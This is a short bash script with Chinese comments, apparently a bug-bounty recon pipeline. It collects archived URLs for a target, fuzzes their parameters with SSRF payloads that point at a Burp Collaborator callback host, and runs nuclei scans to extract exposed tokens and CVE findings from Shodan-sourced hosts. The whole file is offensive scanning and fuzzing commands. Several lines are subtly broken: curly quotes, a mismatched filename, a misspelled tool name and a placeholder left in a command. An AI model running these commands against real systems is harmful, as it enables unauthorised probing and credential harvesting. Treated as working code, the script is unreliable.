#!/bin/bash
# 收集uri并制作fuzz字典
gau -subs example.com >> vul1.txt
waybackurls example.com >> vul2.txt
subfinder -d example.com -silent | waybackurls >> vul3.txt
cat vul1.txt vuln2.txt vul3.txt | grep “=” | sort -u | grep “?” | httpx -silent >> FUZZvul.txt
# ssrf fuzz 使用httpx指定burp代理
xargs -a /root/magicparameter/ssrf.txt -I@ bash -c ‘for url in $(cat FUZZvul.txt); do echo “$url&@=http://burpcollabrator.net”;done’ | httpx -http-proxy http://127.0.0.1:8080
# nuclei扫描
# 使用nuclei提取页面token
cat urls.txt | assestfinder | httprobe | gauplus | nuclei -t exposures/tokens/
nuclei -u URL -t headless/extract-url.yaml -headless -silent | grep "^http" | nuclei -t exposures/tokens/
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
cat list | nuclei -t nuclei-templates/{files,cves,tokens} -v -o result
